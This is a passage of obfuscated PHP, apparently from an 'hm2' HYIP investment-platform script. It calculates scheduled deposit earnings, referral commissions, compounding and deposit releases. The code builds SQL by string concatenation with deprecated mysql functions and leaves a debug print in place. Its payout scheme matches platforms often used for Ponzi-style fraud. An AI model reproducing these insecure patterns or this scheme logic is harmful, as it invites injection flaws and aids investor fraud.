          $elnlcMelGk = floor ($elnlcgVDB[$elnlchyuw['elnlcjawPm']] / 5) * 7 + $elnlcgVDB[$elnlchyuw['elnlcjawPm']] % 5;
          $elnlcshdug = $elnlcgVDB[$elnlchyuw['elnlcnhppU']] - (0 < $elnlcgVDB[$elnlchyuw['elnlcnhppU']] ? 1 : 0);
          $elnlcduUdl = '' . ' (' . $elnlcMelGk . ' + ((' . $elnlcgVDB[$elnlchyuw['elnlcjawPm']] . ' % 5 + WEEKDAY(deposit_date)) > 5)*2 + ' . $elnlcshdug . ') ';
        }
        else
        {
          $elnlcMelGk = $elnlcgVDB[$elnlchyuw['elnlcjawPm']] + $elnlcgVDB[$elnlchyuw['elnlcnhppU']] - (0 < $elnlcgVDB[$elnlchyuw['elnlcnhppU']] ? 1 : 0);
          $elnlcduUdl = '' . ' ' . $elnlcMelGk . ' ';
        }

        $elnlcluDIv = $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
        if ($elnlcgVDB[$elnlchyuw['elnlcybqr']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcluDIv . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcqnMW . ' and 
                (
                   deposit_date + interval ' . $elnlcduUdl . ' ' . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                      or
                   deposit_date + interval ' . $elnlcduUdl . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < now()
                )
                and
                (
                   (' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' = 0) || (' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' && (deposit_date + interval ' . $elnlcgVDB[$elnlchyuw['elnlciehD']] . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcGvCo = mysql_query ($q);
          while ($elnlcIHmju = mysql_fetch_array ($elnlcGvCo))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcIHmju[$elnlchyuw['elnlciorSe']] . ',
      		amount = ' . $elnlcIHmju[$elnlchyuw['elnlcCNVKJ']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcIHmju[$elnlchyuw['elnlcCNVKJ']] . ',
                ec = ' . $elnlcIHmju[$elnlchyuw['elnlcmhRT']] . ',
      		date = \'' . $elnlcIHmju[$elnlchyuw['elnlcRKCW']] . ('' . '\' + interval ' . $elnlcMelGk . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcIHmju[$elnlchyuw['elnlclRBWS']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcqnMW . ' and 
    	       (deposit_date + interval ' . $elnlcduUdl . ' ' . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < last_pay_date
                  or
                deposit_date + interval ' . $elnlcduUdl . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < now()) and
               ((' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' = 0) || (' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' && (deposit_date + interval ' . $elnlcgVDB[$elnlchyuw['elnlciehD']] . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlcluDIv . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcfhars ($elnlcgRoE)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    $elnlcQAUMy = array ();
    if (($elnlcTcyic[$elnlchyuw['elnlceOAv']] == 1 AND $elnlcgRoE != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlckLNre']]][$elnlcgVDB[$elnlchyuw['elnlclRBWS']]] = $elnlcgVDB;
    }

    $elnlccSkk = $elnlchyuw['elnlchcRPc'];
    $elnlcdxRaC = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlczrWy'])
    {
      $elnlcPQqu = 't.send_profit_to_stocks,t.send_percent_to_stocks';
      $elnlcTksaI = ' t.pay_by_button = 0 and';
    }

    if ($elnlcgRoE == -1)
    {
      $elnlcdxRaC = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcgRoE . ' and status = \'on\'';
    }

    if ($elnlcgRoE == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcubIy = mysql_query ($q) OR print mysql_error ());
    while ($elnlcnnAak = mysql_fetch_array ($elnlcubIy))
    {
      $elnlcqnMW = $elnlcnnAak[$elnlchyuw['elnlclRBWS']];
      $elnlcBxNVs = fopen ('' . './tmpl_c/lock_user' . $elnlcqnMW, 'w+');
      if (flock ($elnlcBxNVs, LOCK_EX))
      {
      }
      else
      {
        fclose ($elnlcBxNVs);
        continue;
      }

      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcqnMW;
      (mysql_query ($q) OR print mysql_error ());
      $elnlccSkk = $elnlchyuw['elnlchcRPc'];
      $q = 'select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent';
      ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
      while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
      {
        $q = '' . 'select max_deposit as max_amount from hm2_plans where parent = ' . $elnlcgVDB[$elnlchyuw['elnlcqvnw']] . ' and min_deposit = ' . $elnlcgVDB[$elnlchyuw['elnlcroIG']];
        ($elnlcmzhES = mysql_query ($q) OR print mysql_error ());
        while ($elnlcdruD = mysql_fetch_array ($elnlcmzhES))
        {
          $elnlcOGjPz[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]] = $elnlcdruD[$elnlchyuw['elnlcKWUv']];
        }
      }

      while (0 < $elnlccSkk)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
/*              t.rpcp as rpcp,*/
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              t.delay as delay,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              ' . $elnlcPQqu . '
              t.return_profit as return_profit,
              t.return_profit_percent as return_profit_percent
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcqnMW . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              ' . $elnlcTksaI . '
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = \'h\', 60*60, 60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
        $elnlccSkk = $elnlchyuw['elnlcRjwtU'];
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          ++$elnlccSkk;
          if (!isset ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]))
          {
            continue;
          }

          $elnlcjtAF = $elnlchyuw['elnlcRjwtU'];
          $elnlcormLb = $elnlchyuw['elnlcRjwtU'];
          reset ($elnlcQAUMy);
          reset ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]);
          while (list ($elnlcuNse, $elnlckWdOt) = each ($elnlcQAUMy[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]))
          {
            if (($elnlckWdOt[$elnlchyuw['elnlcroIG']] <= $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] AND ($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] <= $elnlckWdOt[$elnlchyuw['elnlcHcrf']] OR $elnlckWdOt[$elnlchyuw['elnlcHcrf']] == 0)))
            {
              $elnlcjtAF = $elnlckWdOt[$elnlchyuw['elnlchJOG']];
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] < $elnlckWdOt[$elnlchyuw['elnlcroIG']] AND $elnlcjtAF == 0))
            {
              $elnlcjtAF = $elnlcormLb;
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] < $elnlckWdOt[$elnlchyuw['elnlcroIG']] AND 0 < $elnlcjtAF))
            {
              break;
            }

            $elnlcormLb = $elnlckWdOt[$elnlchyuw['elnlchJOG']];
          }

          if (($elnlckWdOt[$elnlchyuw['elnlcHcrf']] != 0 AND $elnlckWdOt[$elnlchyuw['elnlcHcrf']] < $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']]))
          {
            $elnlcjtAF = $elnlcormLb;
          }

          $elnlcGHPa = $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] * $elnlcjtAF / 100;
          $elnlcqaPE = '';
          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcqoGF'])
          {
            $elnlcqaPE = ' 1 day ';
          }
          else
          {
            if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'])
            {
              $elnlcqaPE = ' 1 hour ';
            }
            else
            {
              if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcEVvN'])
              {
                $elnlcqaPE = ' 7 day ';
              }
              else
              {
                if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == 'b-w')
                {
                  $elnlcqaPE = ' 14 day ';
                }
                else
                {
                  if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlctcSD'])
                  {
                    $elnlcqaPE = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcFzMrx'])
                    {
                      $elnlcqaPE = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcnBKly'])
                      {
                        $elnlcqaPE = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcuOjHR'])
                        {
                          $elnlcqaPE = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcfRnSo'])
                          {
                            $elnlcqaPE = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlconHe'])
                            {
                              $elnlcqaPE = ' ' . $elnlcgVDB[$elnlchyuw['elnlcjawPm']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcjtAF == 0 AND $elnlcqaPE == ''))
          {
            continue;
          }

          $elnlcUWNOd = -1;
          $q = 'select weekday(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ') as dw');
          ($elnlcmzhES = mysql_query ($q) OR print mysql_error ());
          while ($elnlcdruD = mysql_fetch_array ($elnlcmzhES))
          {
            $elnlcUWNOd = $elnlcdruD[$elnlchyuw['elnlcWWFTf']];
          }

          $q = 'select count(id) as `col` from hm2_history where 
		type = \'earning\' and ' . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ') and ')) . ' deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
          ($elnlcOqBH = mysql_query ($q) OR print mysql_error ());
          $elnlcwUyle = $elnlchyuw['elnlcRjwtU'];
          while ($elnlcsOvF = mysql_fetch_array ($elnlcOqBH))
          {
            $elnlcwUyle = $elnlcsOvF[$elnlchyuw['elnlchGQKt']];
          }

          if ($elnlcwUyle == 0)
          {
            if ((5 <= $elnlcUWNOd AND $elnlcgVDB[$elnlchyuw['elnlcRlQE']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcUWNOd == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
              (mysql_query ($q) OR print mysql_error ());
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                    amount = ' . $elnlcGHPa . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcTcyic[$elnlchyuw['elnlcrihr']] . number_format ($elnlcgVDB[$elnlchyuw['elnlcCNVKJ']], 2) . ('' . ' - ' . $elnlcjtAF . ' %\',
                    actual_amount = ' . $elnlcGHPa . ',
                    date = \'') . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                    ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcDEDb'])
              {
                if ((0 < $elnlcnnAak[$elnlchyuw['elnlcMaAHi']] AND 0 < $elnlcTcyic[$elnlchyuw['elnlceUKil']]))
                {
                  $elnlcNNPuU = $elnlcGHPa * $elnlcTcyic[$elnlchyuw['elnlceUKil']] / 100;
                  $elnlceHmmb = elnlcekjci ($elnlcnnAak[$elnlchyuw['elnlcEzHQ']]);
                  if ($elnlcTcyic[$elnlchyuw['elnlcdVQyP']] <= $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']])
                  {
                    $q = '' . 'select max(actual_amount) as maxam from hm2_deposits where user_id = ' . $elnlcnnAak[$elnlchyuw['elnlcMaAHi']] . ' and status = \'on\'';
                    ($elnlcmzhES = mysql_query ($q) OR print mysql_error ());
                    $elnlcvQRv = $elnlchyuw['elnlcRjwtU'];
                    while ($elnlcdruD = mysql_fetch_array ($elnlcmzhES))
                    {
                      $elnlcvQRv = $elnlcdruD[$elnlchyuw['elnlcNwLpP']];
                    }

                    if ($elnlcTcyic[$elnlchyuw['elnlclyTUo']] <= $elnlcvQRv)
                    {
                      $q = '' . 'insert into hm2_history set user_id = ' . $elnlcnnAak[$elnlchyuw['elnlcMaAHi']] . ',
			amount = ' . $elnlcNNPuU . ',
			type = \'commissions\',
			description = \'Daily referral earning from user ' . $elnlceHmmb . '\',
			actual_amount = ' . $elnlcNNPuU . ',
			date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                        ec = ' . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
			str = \'gg\'');
                      (mysql_query ($q) OR print mysql_error ());
                    }
                  }
                }
              }

              if (($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlczrWy'] AND $elnlcgVDB[$elnlchyuw['elnlcRatUu']]))
              {
                $elnlcWAMtd = floor ($elnlcGHPa * $elnlcgVDB[$elnlchyuw['elnlcKCjTs']]) / 100;
                if (0 < $elnlcWAMtd)
                {
                  $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                      amount = -' . $elnlcWAMtd . ',
                      type = \'penality\',
                      description = \'Earning moved to Stocks account\',
                      actual_amount = -' . $elnlcWAMtd . ',
                      date = \'') . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                      ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                      str = \'gg\',
                      deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = 'insert into sh2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                      amount = ' . $elnlcWAMtd . ',
                      type = \'bonus\',
                      description = \'Earning received to buy shares\',
                      actual_amount = ' . $elnlcWAMtd . ',
                      date = \'') . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                      ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                      str = \'gg\'';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }

          $elnlcMsNcL = '';
          if ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlconHe'])
          {
            if (($elnlcgVDB[$elnlchyuw['elnlcNRnay']] == 0 OR ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] AND $elnlcgVDB[$elnlchyuw['elnlcQIUK']])))
            {
              $elnlcMsNcL = ', status = \'off\'';
            }

            if (($elnlcgVDB[$elnlchyuw['elnlcybqr']] == 1 AND ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] == 0 OR ($elnlcgVDB[$elnlchyuw['elnlcNRnay']] AND $elnlcgVDB[$elnlchyuw['elnlcQIUK']]))))
            {
              $elnlcqbWqO = $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']];
              $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
                    amount = ' . $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcqbWqO . ',
                    ec = ' . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ('' . ',
                    date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . '\' + interval ' . $elnlcqaPE . ',
                    deposit_id = ') . $elnlcgVDB[$elnlchyuw['elnlclRBWS']] . ',
                    description = \'Deposit release\'';
              (mysql_query ($q) OR print mysql_error ());
              if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcDyDp'])
              {
                if (0 < $elnlcgVDB[$elnlchyuw['elnlcStyIm']])
                {
                  $q = '' . 'select sum(actual_amount) as amt from hm2_history where deposit_id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']] . ' and type = \'earning\' and user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']];
                  print $q;
                  ($elnlceyJA = mysql_query ($q) OR print mysql_error ());
                  $elnlcNSKm = $elnlchyuw['elnlcRjwtU'];
                  while ($elnlciLQp = mysql_fetch_array ($elnlceyJA))
                  {
                    $elnlcNSKm = $elnlciLQp[$elnlchyuw['elnlcsNyQ']];
                  }

                  $elnlcApKUU = ($elnlcqbWqO + $elnlcNSKm) * $elnlcgVDB[$elnlchyuw['elnlcStyIm']] / 100;
                  $elnlcshdug = intval ($elnlcgVDB[$elnlchyuw['elnlcnhppU']]);
                  $q = '' . 'insert into hm2_deposits set 
		           user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
		           type_id = ' . $elnlcgVDB[$elnlchyuw['elnlcqvnw']] . ',
		           deposit_date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . '\' + interval ' . $elnlcqaPE . ',
		           last_pay_date = (\'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . '\' + interval ' . $elnlcqaPE . ') + interval ' . $elnlcshdug . ' day,
		           status = \'on\',
		           amount = ' . $elnlcApKUU . ',
		           actual_amount = ' . $elnlcApKUU . ',
		           compound = 0,
		           ec = ' . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                  $elnlcphuj = mysql_insert_id ();
                  $q = '' . 'insert into hm2_history set 
		           user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ',
		           amount = -' . $elnlcApKUU . ',
		           actual_amount = -' . $elnlcApKUU . ',
		           type=\'deposit\',
		           date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . '\' + interval ' . $elnlcqaPE . ',
		           description = \'Deposit (reinvest)\',
		           ec = ' . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
		           deposit_id = ' . $elnlcphuj . '    ';
                  (mysql_query ($q) OR print mysql_error ());
                }
              }
            }
          }
          else
          {
            if ((5 <= $elnlcUWNOd AND $elnlcgVDB[$elnlchyuw['elnlcRlQE']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcgVDB[$elnlchyuw['elnlcStyIm']] AND $elnlcgVDB[$elnlchyuw['elnlcStyIm']] <= 100) AND $elnlcgVDB[$elnlchyuw['elnlcFhrHQ']] == 1))
              {
                if ($elnlcgVDB[$elnlchyuw['elnlcsWIGP']] == 0)
                {
                  $elnlcgVDB[$elnlchyuw['elnlcsWIGP']] = $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] + 1;
                }

                if (($elnlcgVDB[$elnlchyuw['elnlcNsiAD']] <= $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] AND $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] <= $elnlcgVDB[$elnlchyuw['elnlcsWIGP']]))
                {
                  if ($elnlcgVDB[$elnlchyuw['elnlcQSjJt']] == 1)
                  {
                    $elnlcpqAJt = preg_split ('/\\s*,\\s*/', $elnlcgVDB[$elnlchyuw['elnlclUSEx']]);
                    if (!in_array ($elnlcgVDB[$elnlchyuw['elnlcStyIm']], $elnlcpqAJt))
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcpqAJt[0];
                    }
                  }
                  else
                  {
                    if ($elnlcgVDB[$elnlchyuw['elnlcStyIm']] < $elnlcgVDB[$elnlchyuw['elnlcWDayO']])
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcgVDB[$elnlchyuw['elnlcWDayO']];
                    }

                    if ($elnlcgVDB[$elnlchyuw['elnlclTMy']] < $elnlcgVDB[$elnlchyuw['elnlcStyIm']])
                    {
                      $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlcgVDB[$elnlchyuw['elnlclTMy']];
                    }
                  }
                }
                else
                {
                  $elnlcgVDB[$elnlchyuw['elnlcStyIm']] = $elnlchyuw['elnlcRjwtU'];
                }

                if ((0 < $elnlcgVDB[$elnlchyuw['elnlcStyIm']] AND $elnlcgVDB[$elnlchyuw['elnlcStyIm']] <= 100))
                {
                  $elnlcVdjzK = $elnlcGHPa * $elnlcgVDB[$elnlchyuw['elnlcStyIm']] / 100;
                  $elnlcGHPa = floor ((floor ($elnlcGHPa * 100000) / 100000 - floor ($elnlcVdjzK * 100000) / 100000) * 100) / 100;
                  if (($elnlcOGjPz[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]] == 0 OR $elnlcgVDB[$elnlchyuw['elnlcCNVKJ']] + $elnlcVdjzK < $elnlcOGjPz[$elnlcgVDB[$elnlchyuw['elnlcqvnw']]]))
                  {
                    $q = 'insert into hm2_history set user_id = ' . $elnlcgVDB[$elnlchyuw['elnlciorSe']] . ('' . ',
                        amount = -' . $elnlcVdjzK . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcVdjzK . ',
                    		ec = ') . $elnlcgVDB[$elnlchyuw['elnlcmhRT']] . ',
                    		date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE . ',
                                deposit_id = ') . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
                    (mysql_query ($q) OR print mysql_error ());
                    $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcVdjzK . ',
                    		actual_amount = actual_amount + ' . $elnlcVdjzK . '
                    		where id = ' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
                    (mysql_query ($q) OR print mysql_error ());
                  }
                }
              }

              elnlctygcv ($elnlcgVDB[$elnlchyuw['elnlclRBWS']], $elnlcGHPa, 'date = \'' . $elnlcgVDB[$elnlchyuw['elnlcrSMRI']] . ('' . '\' + interval ' . $elnlcqaPE));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcqaPE . ' ' . $elnlcMsNcL . ' where id =' . $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlczrWy'])
      {
        $q = 'select * from hm2_types where q_days > 0 and pay_by_button != 1';
      }
      else
      {
        $q = 'select * from hm2_types where q_days > 0';
      }

      $elnlcTpvVW = mysql_query ($q);
      while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
      {
        $elnlcMelGk = $elnlcgVDB[$elnlchyuw['elnlcjawPm']] + $elnlcgVDB[$elnlchyuw['elnlcnhppU']] - (0 < $elnlcgVDB[delay] ? 1 : 0);
        $elnlcluDIv = $elnlcgVDB[$elnlchyuw['elnlclRBWS']];
        if ($elnlcgVDB[$elnlchyuw['elnlcybqr']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcluDIv . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcqnMW . ' and 
                (deposit_date + interval ' . $elnlcMelGk . ' ' . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcMelGk . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ('' . ' < now()) and
                ((' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' = 0) || (' . $elnlcgVDB[$elnlchyuw['elnlcNRnay']] . ' && (deposit_date + interval ' . $elnlcgVDB[$elnlchyuw['elnlciehD']] . ' ') . ($elnlcgVDB[$elnlchyuw['elnlcfszFO']] == $elnlchyuw['elnlcRauk'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcGvCo = mysql_query ($q);
          while ($elnlcIHmju = mysql_fetch_array ($elnlcGvCo))
          {
            $elnlcqbWqO = $elnlcIHmju[$elnlchyuw['elnlcCNVKJ']];
